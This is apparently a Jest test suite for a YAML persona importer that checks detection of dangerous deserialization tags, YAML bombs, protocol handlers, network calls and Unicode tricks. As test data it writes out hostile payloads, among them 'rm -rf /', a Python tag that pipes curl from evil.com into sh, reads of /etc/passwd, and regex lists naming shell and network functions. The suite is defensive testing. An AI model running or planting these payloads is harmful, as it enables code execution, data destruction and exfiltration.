import { describe, test, expect } from '@jest/globals';
import { SecurityTestFramework } from '../setup.js';
import yaml from 'js-yaml';

describe('YAML Deserialization Security Tests', () => {
  describe('Dangerous YAML tags', () => {
    test('should detect JavaScript function injection', () => {
      const maliciousYaml = [
        `name: !!js/function "function(){require('child_process').exec('calc.exe')}"`,
        `exploit: !!js/function >\n  function() {\n    process.mainModule.require('child_process').exec('rm -rf /');\n  }`,
        `data: !!js/eval "process.exit()"`,
        `cmd: !!js/require child_process`
      ];
      
      for (const yaml of maliciousYaml) {
        expect(() => {
          // Using default schema (unsafe)
          // yaml.load(yaml); // This would execute code!
          
          // Should detect dangerous tags
          if (yaml.includes('!!js/')) {
            throw new Error('Dangerous YAML tag detected');
          }
        }).toThrow('Dangerous YAML tag detected');
      }
    });

    test('should detect expanded language-specific deserialization attacks', () => {
      const expandedExploits = [
        // Ruby deserialization
        { yaml: `exploit: !!ruby/object:Kernel`, pattern: '!!ruby/', desc: 'Ruby object injection' },
        { yaml: `rce: !!ruby/hash { }`, pattern: '!!ruby/', desc: 'Ruby hash injection' },
        { yaml: `backdoor: !!ruby/struct:OpenStruct`, pattern: '!!ruby/', desc: 'Ruby struct injection' },
        { yaml: `marshal: !!ruby/marshal { }`, pattern: '!!ruby/', desc: 'Ruby marshal injection' },
        
        // Java deserialization
        { yaml: `exploit: !!java/object:java.lang.Runtime`, pattern: '!!java', desc: 'Java object injection' },
        { yaml: `rce: !!javax/script/ScriptEngineManager`, pattern: '!!javax', desc: 'Java script engine injection' },
        { yaml: `backdoor: !!com.sun.rowset.JdbcRowSetImpl`, pattern: '!!com.sun', desc: 'Java rowset injection' },
        
        // Perl deserialization
        { yaml: `exploit: !!perl/hash { }`, pattern: '!!perl/', desc: 'Perl hash injection' },
        { yaml: `rce: !!perl/code sub { system("rm -rf /") }`, pattern: '!!perl/', desc: 'Perl code injection' },
        
        // PHP deserialization
        { yaml: `exploit: !!php/object "O:8:\\"stdClass\\":0:{}"`, pattern: '!!php/', desc: 'PHP object injection' },
        
        // Constructor and function injection
        { yaml: `exploit: !!call [system, "rm -rf /"]`, pattern: '!!call', desc: 'Function call injection' },
        { yaml: `rce: !!invoke { target: eval, args: ["evil_code()"] }`, pattern: '!!invoke', desc: 'Method invoke injection' },
        
        // YAML-specific dangerous features
        { yaml: `exploit: !!binary "base64encodedpayload"`, pattern: '!!binary', desc: 'Binary data injection' },
        { yaml: `merge: !!merge { << : *evil }`, pattern: '!!merge', desc: 'Merge key injection' }
      ];
      
      for (const { yaml: yamlContent, pattern, desc } of expandedExploits) {
        expect(() => {
          if (yamlContent.includes(pattern)) {
            throw new Error(`Dangerous YAML pattern detected: ${desc}`);
          }
        }).toThrow(/Dangerous YAML pattern detected/);
      }
    });
    
    test('should detect Python object injection', () => {
      const pythonExploits = [
        `exploit: !!python/object/apply:os.system ["rm -rf /"]`,
        `rce: !!python/object/new:subprocess.Popen [["curl", "evil.com/shell.sh", "|", "sh"]]`,
        `backdoor: !!python/object/apply:subprocess.check_output [["cat", "/etc/passwd"]]`
      ];
      
      for (const yaml of pythonExploits) {
        expect(() => {
          if (yaml.includes('!!python/')) {
            throw new Error('Python object injection detected');
          }
        }).toThrow('Python object injection detected');
      }
    });
    
    test('should only allow CORE_SCHEMA types', () => {
      const safeYaml = `
name: Test Persona
description: A safe persona
version: 1.0.0
triggers:
  - hello
  - hi
`;
      
      // Safe loading with CORE_SCHEMA
      const loaded = yaml.load(safeYaml, {
        schema: yaml.CORE_SCHEMA
      });
      
      expect(loaded).toEqual({
        name: 'Test Persona',
        description: 'A safe persona',
        version: '1.0.0',
        triggers: ['hello', 'hi']
      });
      
      // Verify only basic types
      expect(typeof loaded.name).toBe('string');
      expect(Array.isArray(loaded.triggers)).toBe(true);
    });
  });
  
  describe('YAML bomb attacks', () => {
    test('should detect exponential entity expansion', () => {
      const yamlBomb = `
a: &a ["lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol"]
b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d, *d]
`;
      
      expect(() => {
        // Check for excessive anchors/aliases
        const anchorCount = (yamlBomb.match(/&\w+/g) || []).length;
        const aliasCount = (yamlBomb.match(/\*\w+/g) || []).length;
        
        if (anchorCount > 10 || aliasCount > 20) {
          throw new Error('Potential YAML bomb detected');
        }
      }).toThrow('Potential YAML bomb detected');
    });
    
    test('should enforce size limits', () => {
      const largeYaml = 'x: "' + 'A'.repeat(100000) + '"';
      
      expect(() => {
        if (largeYaml.length > 50000) {
          throw new Error('YAML content too large');
        }
      }).toThrow('YAML content too large');
    });

    test('should detect enhanced YAML bomb patterns', () => {
      const enhancedBombs = [
        // Merge key bombs
        {
          yaml: `
base: &base { a: 1, b: 2, c: 3, d: 4, e: 5 }
level1: { <<: *base, <<: *base, <<: *base, <<: *base, <<: *base, <<: *base }
level2: { <<: *base, <<: *base, <<: *base, <<: *base, <<: *base, <<: *base }
level3: { <<: *base, <<: *base, <<: *base, <<: *base, <<: *base, <<: *base }
`,
          desc: 'merge key bomb'
        },
        
        // Multiple document bombs
        {
          yaml: `---
doc1: &ref [data, data, data]
---
doc2: *ref
---
doc3: *ref
---
doc4: *ref
---
doc5: *ref
`,
          desc: 'multi-document bomb'
        },
        
        // Nested tag with anchor combination
        {
          yaml: `exploit: &evil !!python/object/apply:os.system ["rm -rf /"]`,
          desc: 'nested tag with anchor'
        }
      ];
      
      for (const { yaml: yamlContent, desc } of enhancedBombs) {
        expect(() => {
          const anchorCount = (yamlContent.match(/&\w+/g) || []).length;
          const aliasCount = (yamlContent.match(/\*\w+/g) || []).length;
          const mergeKeyCount = (yamlContent.match(/<<:/g) || []).length;
          const documentCount = (yamlContent.match(/^---/gm) || []).length;
          const nestedTagPattern = /[&*]\w+\s*!!/;
          
          if (anchorCount > 10 || aliasCount > 20 || mergeKeyCount > 5 || documentCount > 3) {
            throw new Error(`Enhanced YAML bomb detected: ${desc}`);
          }
          
          if (nestedTagPattern.test(yamlContent)) {
            throw new Error(`Dangerous nested YAML tag combination: ${desc}`);
          }
        }).toThrow(/Enhanced YAML bomb detected|Dangerous nested YAML tag combination/);
      }
    });
  });

  describe('Protocol handler and network attacks', () => {
    test('should detect dangerous protocol handlers in YAML content', () => {
      const protocolAttacks = [
        { yaml: `url: "file:///etc/passwd"`, pattern: 'file://', desc: 'file protocol handler' },
        { yaml: `data: "data://text/plain;base64,SGVsbG8="`, pattern: 'data://', desc: 'data protocol handler' },
        { yaml: `resource: "expect://command"`, pattern: 'expect://', desc: 'expect protocol handler' },
        { yaml: `script: "php://filter/read=convert.base64-encode/resource=index.php"`, pattern: 'php://', desc: 'PHP protocol handler' },
        { yaml: `archive: "phar://malicious.phar/file.txt"`, pattern: 'phar://', desc: 'PHAR protocol handler' },
        { yaml: `compressed: "zip://archive.zip#file.txt"`, pattern: 'zip://', desc: 'ZIP protocol handler' },
        { yaml: `remote: "ssh2://user:pass@host/path"`, pattern: 'ssh2://', desc: 'SSH2 protocol handler' },
        { yaml: `media: "ogg://stream.example.com/audio"`, pattern: 'ogg://', desc: 'OGG protocol handler' }
      ];
      
      for (const { yaml: yamlContent, pattern, desc } of protocolAttacks) {
        expect(() => {
          if (yamlContent.includes(pattern)) {
            throw new Error(`Dangerous protocol handler detected: ${desc}`);
          }
        }).toThrow(/Dangerous protocol handler detected/);
      }
    });

    test('should detect network operation patterns', () => {
      const networkPatterns = [
        { yaml: `request: "socket.connect('evil.com', 80)"`, pattern: 'socket.connect', desc: 'socket operation' },
        { yaml: `fetch_data: "urllib.request.urlopen('http://evil.com')"`, pattern: 'urllib.request', desc: 'urllib operation' },
        { yaml: `api_call: "requests.get('http://evil.com/api')"`, pattern: 'requests.get', desc: 'requests operation' },
        { yaml: `download: "fetch('http://evil.com/payload')"`, pattern: "fetch('http://", desc: 'fetch operation' },
        { yaml: `xhr: "new XMLHttpRequest()"`, pattern: 'new XMLHttpRequest', desc: 'XMLHttpRequest operation' },
        { yaml: `get_request: ".get('http://evil.com')"`, pattern: ".get('http://", desc: 'HTTP GET operation' },
        { yaml: `post_request: ".post('http://evil.com', data)"`, pattern: ".post('http://", desc: 'HTTP POST operation' }
      ];
      
      for (const { yaml: yamlContent, pattern, desc } of networkPatterns) {
        expect(() => {
          if (yamlContent.includes(pattern)) {
            throw new Error(`Network operation detected: ${desc}`);
          }
        }).toThrow(/Network operation detected/);
      }
    });
  });

  describe('Unicode and encoding bypass attempts', () => {
    test('should detect Unicode direction override attacks', () => {
      const unicodeAttacks = [
        // Direction override characters
        { yaml: `name: "admin\u202Euser"`, desc: 'right-to-left override' },
        { yaml: `file: "safe.txt\u202Dmalicious.exe"`, desc: 'left-to-right override' },
        { yaml: `path: "/safe\u2066/hidden\u2069/file.txt"`, desc: 'directional isolate' },
        
        // Zero-width characters
        { yaml: `cmd: "echo\u200B evil"`, desc: 'zero-width space' },
        { yaml: `script: "rm\u2028 -rf /"`, desc: 'line separator' },
        { yaml: `code: "eval\u202F('evil')"`, desc: 'narrow no-break space' },
        
        // Special markers
        { yaml: `payload: "\uFEFFhidden_command"`, desc: 'BOM character' },
        { yaml: `exploit: "cmd\uFFFE"`, desc: 'non-character' },
        
        // Unicode escape sequences
        { yaml: `quote: "\\u0022evil\\u0022"`, desc: 'Unicode quote escape' },
        { yaml: `apostrophe: "\\u0027cmd\\u0027"`, desc: 'Unicode apostrophe escape' },
        { yaml: `bracket: "\\u003Cscript\\u003E"`, desc: 'Unicode bracket escape' },
        { yaml: `entity: "\\u003cscript"`, desc: 'Unicode entity escape' }
      ];
      
      for (const { yaml: yamlContent, desc } of unicodeAttacks) {
        expect(() => {
          // Check for direction override characters
          if (/[\u202A-\u202E\u2066-\u2069]/.test(yamlContent)) {
            throw new Error(`Direction override attack detected: ${desc}`);
          }
          
          // Check for zero-width and special spaces
          if (/[\u200B-\u200F\u2028-\u202F]/.test(yamlContent)) {
            throw new Error(`Zero-width character attack detected: ${desc}`);
          }
          
          // Check for special markers
          if (/[\uFEFF\uFFFE\uFFFF]/.test(yamlContent)) {
            throw new Error(`Special marker attack detected: ${desc}`);
          }
          
          // Check for Unicode escape sequences
          if (/\\[uU]0*(?:22|27|60|3[cC])/.test(yamlContent)) {
            throw new Error(`Unicode escape attack detected: ${desc}`);
          }
        }).toThrow(/attack detected/);
      }
    });

    test('should NOT flag legitimate content that was previously causing false positives', () => {
      const legitimateYaml = [
        'name: "Test Import Persona"',
        'description: "Test description for import"',
        'version: "1.0"',
        'author: "test-author"',
        'category: "test"',
        'unique_id: "test-import_20250711-120000_test-author"',
        'created_date: "2025-07-11T12:00:00.000Z"',
        'content: "You are a helpful test assistant."',
        'filename: "test-import.md"',
        'exportedAt: "2025-07-11T12:00:00.000Z"',
        'exportedBy: "test-user"',
        'instructions: "Please import this persona and help users with their questions."',
        'usage: "Use .get() method to retrieve data safely"',
        'notes: "This requires careful handling of open() calls"',
        'docs: "See readFile documentation for examples"'
      ];
      
      for (const yamlLine of legitimateYaml) {
        // These should NOT trigger any security patterns
        expect(() => {
          // Apply the same pattern checks as our validator
          // If any pattern matches, this would indicate a false positive
          
          // All these should be safe and not match any dangerous patterns
          const checks = [
            /subprocess\./,
            /os\.system/,
            /eval\s*\(/,
            /exec\s*\(/,
            /__import__\s*\(/,
            /require\s*\(/,
            /import\s+(?:os|sys|subprocess|eval|exec)/,
            /socket\.connect/,
            /urllib\.request/,
            /requests\.(?:get|post|put|delete)\s*\(/,
            /fetch\s*\(\s*["']https?:\/\//,
            /new\s+XMLHttpRequest/,
            /\.(?:get|post|put|delete)\s*\(\s*["']https?:\/\//,
            /(?:fs\.|file\.|)\s*open\s*\(\s*["'](?:\/etc\/|\/bin\/|\.\.\/)/
          ];
          
          for (const pattern of checks) {
            if (pattern.test(yamlLine)) {
              throw new Error(`False positive: ${pattern} matched legitimate content: ${yamlLine}`);
            }
          }
        }).not.toThrow();
      }
    });
  });
  
  describe('Schema validation', () => {
    test('should validate persona metadata schema', () => {
      const testCases = [
        {
          yaml: `
name: Valid Persona
description: A valid test persona
category: professional
`,
          valid: true
        },
        {
          yaml: `
name: ""
description: Invalid - empty name
`,
          valid: false
        },
        {
          yaml: `
name: ${'.'.repeat(101)}
description: Invalid - name too long
`,
          valid: false
        },
        {
          yaml: `
name: Injection Test
description: Test
malicious_field: !!js/function "alert()"
`,
          valid: false
        }
      ];
      
      for (const { yaml: yamlContent, valid } of testCases) {
        if (valid) {
          expect(() => {
            const data = yaml.load(yamlContent, { schema: yaml.CORE_SCHEMA });
            // Basic validation
            if (!data.name || data.name.length > 100) {
              throw new Error('Invalid name');
            }
            if (!data.description || data.description.length > 1000) {
              throw new Error('Invalid description');
            }
          }).not.toThrow();
        } else {
          expect(() => {
            // Check for dangerous content first
            if (yamlContent.includes('!!')) {
              throw new Error('Dangerous tag');
            }
            
            const data = yaml.load(yamlContent, { schema: yaml.CORE_SCHEMA });
            if (!data.name || data.name.length === 0 || data.name.length > 100) {
              throw new Error('Invalid name');
            }
          }).toThrow();
        }
      }
    });
    
    test('should sanitize string fields', () => {
      const inputs = [
        { input: 'Normal text', expected: 'Normal text' },
        { input: '<script>alert("XSS")</script>', expected: 'scriptalert("XSS")/script' },
        { input: 'Text\x00with\x00nulls', expected: 'Textwithnulls' },
        { input: 'Line1\nLine2\rLine3', expected: 'Line1 Line2 Line3' },
        { input: '  Trimmed  ', expected: 'Trimmed' }
      ];
      
      for (const { input, expected } of inputs) {
        const sanitized = input
          .replace(/[<>]/g, '')
          .replace(/\x00/g, '')
          .replace(/[\r\n]/g, ' ')
          .trim();
        
        expect(sanitized).toBe(expected);
      }
    });
  });
  
  describe('gray-matter integration', () => {
    test('should use safe options with gray-matter', () => {
      // Simulate safe gray-matter usage
      const safeOptions = {
        engines: {
          yaml: (str: string) => yaml.load(str, { schema: yaml.CORE_SCHEMA })
        }
      };
      
      expect(safeOptions.engines.yaml).toBeDefined();
      
      // Test that it rejects dangerous content
      expect(() => {
        const dangerous = 'name: !!js/function "alert()"';
        safeOptions.engines.yaml(dangerous);
      }).toThrow();
    });
  });
  
  describe('Content validation', () => {
    test('should validate array fields', () => {
      const testCases = [
        {
          triggers: ['hello', 'hi', 'hey'],
          valid: true
        },
        {
          triggers: Array(25).fill('trigger'), // Too many
          valid: false
        },
        {
          triggers: ['a'.repeat(60)], // Individual item too long
          valid: false
        }
      ];
      
      for (const { triggers, valid } of testCases) {
        if (valid) {
          expect(triggers.length).toBeLessThanOrEqual(20);
          expect(triggers.every(t => t.length <= 50)).toBe(true);
        } else {
          expect(
            triggers.length > 20 || 
            triggers.some(t => t.length > 50)
          ).toBe(true);
        }
      }
    });
  });
});